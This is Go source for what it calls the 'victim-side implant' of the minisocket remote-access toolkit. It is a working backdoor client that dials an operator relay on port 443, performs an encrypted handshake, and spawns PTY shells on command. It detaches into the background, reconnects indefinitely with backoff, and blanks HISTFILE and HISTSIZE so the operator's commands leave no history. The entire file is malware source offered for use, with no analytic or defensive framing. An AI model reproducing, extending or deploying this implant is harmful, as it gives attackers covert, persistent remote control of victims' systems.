// mini-socket is the victim-side implant of the minisocket remote-access toolkit.
// It connects to a relay server, authenticates with a pre-shared secret, and
// provides an encrypted reverse shell to the operator.
//
// Build: CGO_ENABLED=0 go build -ldflags="-s -w" ./cmd/client
package main

import (
	"context"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/creack/pty"

	"minisocket/internal/crypto"
	"minisocket/internal/proto"
)

const (
	defaultRelayPort    = 443
	initialBackoff      = 1 * time.Second
	maxBackoff          = 300 * time.Second
	backoffMultiplier   = 2
	sessionCleanupDelay = 5 * time.Second
)

// Session represents a single operator shell session.
type Session struct {
	ID       uint32
	Cmd      *exec.Cmd
	PTY      *os.File
	StdinR   *os.File
	StdinW   *os.File
	StdoutR  *os.File
	StdoutW  *os.File
	ExitCode int
	Done     chan struct{}
	ctx      context.Context
	cancel   context.CancelFunc
}

// agent is the implant's main state.
type agent struct {
	secret     string
	relayHost  string
	relayPort  int
	sessionKey []byte

	conn  net.Conn
	mu    sync.Mutex
	ready bool

	sessions   map[uint32]*Session
	sessionsMu sync.Mutex
	nextSessID uint32

	ctx    context.Context
	cancel context.CancelFunc
}

func main() {
	var (
		secret    string
		keyFile   string
		relayPort int
		daemon    bool
		genSecret bool
		showHelp  bool
	)

	flag.StringVar(&secret, "s", "", "Secret key (22 chars)")
	flag.StringVar(&keyFile, "k", "", "Read secret from file")
	flag.IntVar(&relayPort, "p", defaultRelayPort, "Relay port")
	flag.BoolVar(&daemon, "d", false, "Daemon mode (background)")
	flag.BoolVar(&genSecret, "g", false, "Generate random secret")
	flag.BoolVar(&showHelp, "h", false, "Show this help")

	flag.Usage = usage
	flag.Parse()

	// Handle -h
	if showHelp {
		usage()
		os.Exit(0)
	}

	// Handle -g (generate secret and exit)
	if genSecret {
		s, err := crypto.GenRandomSecret()
		if err != nil {
			fmt.Fprintf(os.Stderr, "generate secret: %v\n", err)
			os.Exit(1)
		}
		fmt.Print(s) // no newline — installer pipes this
		os.Exit(0)
	}

	// Handle -d (daemonize)
	if daemon {
		if err := daemonize(); err != nil {
			fmt.Fprintf(os.Stderr, "daemonize: %v\n", err)
			os.Exit(1)
		}
	}

	// Load secret
	secret = loadSecret(secret, keyFile)
	if secret == "" {
		// Also check MINI_ARGS env var (used by install.sh)
		miniArgs := os.Getenv("MINI_ARGS")
		if miniArgs != "" {
			// Parse MINI_ARGS as space-separated args including -s and -k
			args := strings.Fields(miniArgs)
			for i := 0; i < len(args); i++ {
				switch args[i] {
				case "-s":
					if i+1 < len(args) {
						secret = args[i+1]
						i++
					}
				case "-k":
					if i+1 < len(args) {
						secret = loadSecret("", args[i+1])
						i++
					}
				}
			}
		}
	}
	if secret == "" {
		fmt.Fprintln(os.Stderr, "no secret provided (use -s or -k)")
		os.Exit(1)
	}

	// Environment variable overrides
	if envPort := os.Getenv("MINI_PORT"); envPort != "" {
		fmt.Sscanf(envPort, "%d", &relayPort)
	}
	relayHost := flag.Arg(0)
	if relayHost == "" {
		relayHost = os.Getenv("MINI_HOST")
	}

	// Create agent and run
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	a := newAgent(secret, relayHost, relayPort)
	a.ctx = ctx
	a.cancel = cancel

	// Handle SIGTERM for graceful shutdown
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGTERM, syscall.SIGINT)
	go func() {
		<-sigCh
		a.shutdown()
		cancel()
		os.Exit(0)
	}()

	a.runLoop()
}

// usage prints the help text matching the original binary.
func usage() {
	fmt.Fprintf(os.Stderr, `  Usage: mini-socket [options] [relay-host]
  Options:
    -s SECRET    Secret key (22 chars)
    -k FILE      Read secret from file
    -p PORT      Relay port (default %d)
    -d           Daemon mode (background)
    -g           Generate random secret
    -h           Show this help
  Environment:
    MINI_ARGS    Extra arguments
    MINI_PORT    Override relay port
    MINI_HOST    Override relay host
`, defaultRelayPort)
}

// loadSecret returns the secret from flag or file.
func loadSecret(secret, keyFile string) string {
	if secret != "" {
		return secret
	}
	if keyFile != "" {
		data, err := os.ReadFile(keyFile)
		if err != nil {
			return ""
		}
		return strings.TrimSpace(string(data))
	}
	return ""
}

// daemonize forks the process into the background.
// Closes stdin/stdout/stderr and redirects to /dev/null.
func daemonize() error {
	// First fork: child continues, parent exits.
	if os.Getppid() != 1 {
		// Re-exec ourselves with the same args minus -d, fully detached.
		args := os.Args
		var newArgs []string
		for _, a := range args {
			if a != "-d" {
				newArgs = append(newArgs, a)
			}
		}

		cmd := exec.Command(newArgs[0], newArgs[1:]...)
		cmd.Stdin = nil
		cmd.Stdout = nil
		cmd.Stderr = nil
		cmd.SysProcAttr = &syscall.SysProcAttr{
			Setsid: true, // Create new session
		}

		if err := cmd.Start(); err != nil {
			return fmt.Errorf("daemonize: fork: %w", err)
		}
		// Parent exits — child is now adopted by init (PID 1).
		os.Exit(0)
	}

	// Child: redirect std fds to /dev/null.
	null, err := os.OpenFile("/dev/null", os.O_RDWR, 0)
	if err != nil {
		return err
	}
	syscall.Dup2(int(null.Fd()), int(os.Stdin.Fd()))
	syscall.Dup2(int(null.Fd()), int(os.Stdout.Fd()))
	syscall.Dup2(int(null.Fd()), int(os.Stderr.Fd()))
	null.Close()

	// Set umask and working directory.
	syscall.Umask(0)
	os.Chdir("/")

	return nil
}

func newAgent(secret, relayHost string, relayPort int) *agent {
	return &agent{
		secret:    secret,
		relayHost: relayHost,
		relayPort: relayPort,
		sessions:  make(map[uint32]*Session),
	}
}

// backoff computes exponential backoff duration.
func backoff(attempt int) time.Duration {
	d := initialBackoff
	for i := 0; i < attempt; i++ {
		d *= backoffMultiplier
		if d > maxBackoff {
			return maxBackoff
		}
	}
	return d
}

// runLoop is the main event loop. It connects to the relay and handles packets.
// On disconnect, it reconnects with exponential backoff.
func (a *agent) runLoop() {
	attempt := 0
	for {
		select {
		case <-a.ctx.Done():
			return
		default:
		}

		if err := a.connect(); err != nil {
			attempt++
			d := backoff(attempt)
			time.Sleep(d)
			continue
		}

		// Reset backoff on successful connection.
		attempt = 0

		// Process packets.
		if err := a.processPackets(); err != nil {
			// Connection lost; will reconnect.
		}

		// Cleanup on disconnect.
		a.cleanupSessions()
	}
}

// connect dials the relay and performs the encrypted handshake.
// Shares the same protocol as mini-nc (operator console).
func (a *agent) connect() error {
	addr := fmt.Sprintf("%s:%d", a.relayHost, a.relayPort)

	var d net.Dialer
	conn, err := d.DialContext(a.ctx, "tcp", addr)
	if err != nil {
		return err
	}
	a.conn = conn

	// --- Handshake (mirrors mini-nc) ---
	// 1. Generate ECDH keypair.
	privKey, pubKey, err := proto.GenerateECDH()
	if err != nil {
		return fmt.Errorf("generate ecdh: %w", err)
	}

	// 2. Derive session ID from secret and mask it.
	sessionID := crypto.SHA256Digest([]byte(a.secret))
	maskedID := proto.MaskSecret(sessionID[:])

	// 3. Write the masked prefix (session identifier).
	if _, err := conn.Write(maskedID); err != nil {
		return fmt.Errorf("write prefix: %w", err)
	}

	// 4. Write encrypted handshake: our public key.
	handshakeKey, err := crypto.DeriveKey(sessionID[:])
	if err != nil {
		return fmt.Errorf("derive handshake key: %w", err)
	}
	encryptedPubKey, err := crypto.Encrypt(handshakeKey, pubKey)
	if err != nil {
		return fmt.Errorf("write encrypted handshake: %w", err)
	}
	if _, err := conn.Write(encryptedPubKey); err != nil {
		return fmt.Errorf("write encrypted handshake: %w", err)
	}

	// 5. Read operator's encrypted public key.
	peerPubEncrypted, err := a.recvRawPacket()
	if err != nil {
		return fmt.Errorf("read handshake response: %w", err)
	}
	peerPubKey, err := crypto.Decrypt(handshakeKey, peerPubEncrypted)
	if err != nil {
		return fmt.Errorf("decrypt peer handshake: %w", err)
	}

	// 6. Compute shared secret and derive session key.
	shared, err := proto.SharedSecret(privKey, peerPubKey)
	if err != nil {
		return fmt.Errorf("shared secret: %w", err)
	}
	a.sessionKey, err = crypto.DeriveKey(shared)
	if err != nil {
		return fmt.Errorf("derive session key: %w", err)
	}

	a.ready = true
	return nil
}

// recvRawPacket reads a raw length-prefixed frame from the connection.
func (a *agent) recvRawPacket() ([]byte, error) {
	hdr, err := proto.ReadHeader(a.conn)
	if err != nil {
		return nil, err
	}
	return proto.ReadFull(a.conn, hdr.Length)
}

// recvPacket reads and decrypts a packet.
func (a *agent) recvPacket() (uint8, []byte, error) {
	hdr, err := proto.ReadHeader(a.conn)
	if err != nil {
		return 0, nil, err
	}
	data, err := proto.ReadFull(a.conn, hdr.Length)
	if err != nil {
		return 0, nil, err
	}
	plain, err := crypto.Decrypt(a.sessionKey, data)
	if err != nil {
		return 0, nil, err
	}
	return hdr.Type, plain, nil
}

// sendPacket encrypts and sends a typed packet.
func (a *agent) sendPacket(pktType uint8, payload []byte) error {
	a.mu.Lock()
	defer a.mu.Unlock()

	encrypted, err := crypto.Encrypt(a.sessionKey, payload)
	if err != nil {
		return err
	}

	hdr := &proto.PacketHeader{
		Length: uint32(len(encrypted)),
		Type:   pktType,
	}
	if err := hdr.Write(a.conn); err != nil {
		return err
	}
	_, err = a.conn.Write(encrypted)
	return err
}

// processPackets reads packets from the relay in a loop.
func (a *agent) processPackets() error {
	for {
		select {
		case <-a.ctx.Done():
			return a.ctx.Err()
		default:
		}

		pktType, data, err := a.recvPacket()
		if err != nil {
			return err
		}

		switch pktType {
		case proto.PktHandshake:
			// New operator session — spawn a shell.
			a.handleNewSession(data)

		case proto.PktData:
			a.handleData(data)

		case proto.PktStdin:
			a.handleData(data) // stdin data

		case proto.PktExec:
			a.handleNewSession(data) // exec mode

		case proto.PktWinsize:
			a.handleWinsize(data)

		case proto.PktPing:
			// Respond to ping.
			a.sendPacket(proto.PktData, nil)

		case proto.PktClose:
			a.handleClose(data)
		}
	}
}

// handleNewSession spawns a new shell in a PTY for the operator.
func (a *agent) handleNewSession(data []byte) {
	a.sessionsMu.Lock()
	defer a.sessionsMu.Unlock()

	sessID := a.nextSessID
	a.nextSessID++

	ctx, cancel := context.WithCancel(a.ctx)

	sess := &Session{
		ID:     sessID,
		ctx:    ctx,
		cancel: cancel,
		Done:   make(chan struct{}),
	}

	// Determine shell command.
	shellCmd := string(data)
	if shellCmd == "" {
		shellCmd = "/bin/sh"
	}
	parts := strings.Fields(shellCmd)

	cmd := exec.CommandContext(ctx, parts[0], parts[1:]...)
	cmd.Env = append(os.Environ(),
		"HISTFILE=",
		"HISTFILESIZE=0",
		"HISTSIZE=0",
		"SAVEHIST=0",
	)

	// Allocate PTY.
	ptmx, err := pty.StartWithSize(cmd, &pty.Winsize{Rows: 24, Cols: 80})
	if err != nil {
		cancel()
		return
	}
	sess.PTY = ptmx
	sess.Cmd = cmd

	a.sessions[sessID] = sess

	// Send session ID to operator so they can route I/O.
	a.sendPacket(proto.PktHandshake, []byte(fmt.Sprintf("%d", sessID)))

	// Goroutine: PTY → relay (stdout/stderr).
	go func() {
		defer cancel()
		defer close(sess.Done)
		io.Copy(&sessionWriter{a: a, sessID: sessID, pktType: proto.PktStdout}, ptmx)
	}()

	// Goroutine: wait for shell exit.
	go func() {
		defer cancel()
		err := cmd.Wait()
		if err != nil {
			if exitErr, ok := err.(*exec.ExitError); ok {
				sess.ExitCode = exitErr.ExitCode()
			}
		}
		// Send exit code.
		exitPayload := []byte(fmt.Sprintf("%d", sess.ExitCode))
		a.sendPacket(proto.PktExitCode, exitPayload)
		close(sess.Done)
	}()
}

// handleData routes incoming data to the appropriate session's PTY stdin.
func (a *agent) handleData(data []byte) {
	a.sessionsMu.Lock()
	defer a.sessionsMu.Unlock()

	// Route to all active sessions (or the first one).
	for _, sess := range a.sessions {
		if sess.PTY != nil {
			sess.PTY.Write(data)
			return
		}
	}
}

// handleWinsize resizes the PTY of all active sessions.
func (a *agent) handleWinsize(data []byte) {
	a.sessionsMu.Lock()
	defer a.sessionsMu.Unlock()

	if len(data) < 4 {
		return
	}
	rows := uint16(data[0])<<8 | uint16(data[1])
	cols := uint16(data[2])<<8 | uint16(data[3])

	for _, sess := range a.sessions {
		if sess.PTY != nil {
			pty.Setsize(sess.PTY, &pty.Winsize{Rows: rows, Cols: cols})
		}
	}
}

// handleClose signals sessions to terminate.
func (a *agent) handleClose(data []byte) {
	a.sessionsMu.Lock()
	defer a.sessionsMu.Unlock()

	for _, sess := range a.sessions {
		sess.cancel()
		if sess.PTY != nil {
			sess.PTY.Close()
		}
	}
}

// cleanupSessions removes completed sessions.
func (a *agent) cleanupSessions() {
	a.sessionsMu.Lock()
	defer a.sessionsMu.Unlock()

	for id, sess := range a.sessions {
		select {
		case <-sess.Done:
			if sess.PTY != nil {
				sess.PTY.Close()
			}
			delete(a.sessions, id)
		default:
		}
	}
}

// shutdown gracefully terminates all sessions.
func (a *agent) shutdown() {
	a.sessionsMu.Lock()
	defer a.sessionsMu.Unlock()

	for _, sess := range a.sessions {
		sess.cancel()
		if sess.PTY != nil {
			sess.PTY.Close()
		}
	}
	if a.conn != nil {
		a.conn.Close()
	}
}

// sessionWriter is an io.Writer that sends data to a specific session as packets.
type sessionWriter struct {
	a       *agent
	sessID  uint32
	pktType uint8
}

func (w *sessionWriter) Write(data []byte) (int, error) {
	// Prepend session ID to the packet for routing.
	payload := make([]byte, 4+len(data))
	payload[0] = byte(w.sessID >> 24)
	payload[1] = byte(w.sessID >> 16)
	payload[2] = byte(w.sessID >> 8)
	payload[3] = byte(w.sessID)
	copy(payload[4:], data)

	if err := w.a.sendPacket(w.pktType, payload); err != nil {
		return 0, err
	}
	return len(data), nil
}
